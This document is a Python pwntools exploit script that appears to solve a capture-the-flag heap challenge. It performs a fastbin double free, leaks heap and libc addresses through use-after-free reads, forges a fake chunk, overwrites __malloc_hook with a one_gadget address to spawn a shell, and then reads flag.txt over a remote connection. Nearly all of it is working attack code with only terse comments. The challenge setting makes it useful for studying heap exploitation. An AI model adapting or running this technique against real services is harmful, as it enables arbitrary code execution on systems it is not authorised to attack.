#!/usr/bin/python3
from pwn import *
import time
import os

os.chdir('../public') 

# preamble
elf = context.binary = ELF(b"./pwn")
libc = ELF(b"./libc.so.6")
context.terminal = ['tilix', '-a', 'app-new-session', '-e']

# wrapper functrns
def sl(x): return r.sendline(x)
def sla(x, y): return r.sendlineafter(x, y)
def se(x): return r.send(x)
def sa(x, y): return r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))


def log_addr(name, address):
    s = '{}'.format(name).ljust(16, ' ')
    s += ': {:#x}'.format(address)
    log.info(s)


gs = '''
init-pwndbg
set breakpoint pending on
break execve
continue
'''

HOST = '192.168.125.11'
LHOST = 'localhost'
PORT = 1337

DELAY = 0.5  # needed for remote

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        if args.LHOST:
            return remote(LHOST, PORT)
        return remote(HOST, PORT)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def create(name):
    global index
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("1")
    io.sendafter("Name: ", name)
    index += 1
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("2")
    io.sendlineafter("Index: ", str(index))


# view
def view(index):
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("3")
    io.sendlineafter("Index: ", str(index))
    io.recvuntil('Grand Master: ')
    return io.recvline().strip()


# edit
def edit(index, name):
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("4")
    io.sendlineafter("Index: ", f'{index}')
    io.sendlineafter("New name: ", name)


io = start()
io.timeout = 0.5  # needed for final shell to timeout create()

# =-=-=- double free -=-=-=

# Request two fast chunks
a = create(b"magnus")
b = create(b"kasparov")
# create one more to overlap fake smallbin
create(b"fischer")
# create one more to guard against wilderness (needed !)
create(b"dubov")

# Free the first chunk, then the second.
free(a)
free(b)
free(a)

# =-=-=- leak libc -=-=-=\

# leak heap to know where to overwrite
heap_leak = int.from_bytes(view(a), 'little')
heap_base = heap_leak - 0x70
log_addr('heap leak', heap_leak)
log_addr('heap base', heap_base)

# overwrite A fd to point to size field of fast chunk
edit(a, p64(heap_leak - 0x30))
create(b'A' * 0x30 + p64(0) + p64(0x71))
# create fake smallbin to free into unsortedbin
create(b'B' * 0x20 + p64(0x70) + p64(0xe1))  
free(b)

# leak libc 
libc_leak  = int.from_bytes(view(b), 'little')
libc.address = libc_leak - (libc.sym.main_arena + 88)
log_addr('libc base', libc.address)

# =-=-=-=-=-=-=-=-=  overwrite __malloc_hook =-=-=-=-=-=-=-=-= 
# second fastbind dup
# Request two more fast chunks
c = create(b"firoujza")
d = create(b"nakamura")

# free
free(c)
free(d)
free(c)

# overwrite A fd to fake_fast chunk
fake_fast = libc.sym.__malloc_hook - 0x23
edit(c, p64(fake_fast))
create(b'Tal')

# overwrite __malloc_hook with one_gadget and trigger
one_gadget = libc.address + 878337  # rsp + 0x50 == NULL
create(b'A' * 0x13 + p64(one_gadget))
create(b'')

io.sendline('cat flag.txt')
io.interactive()
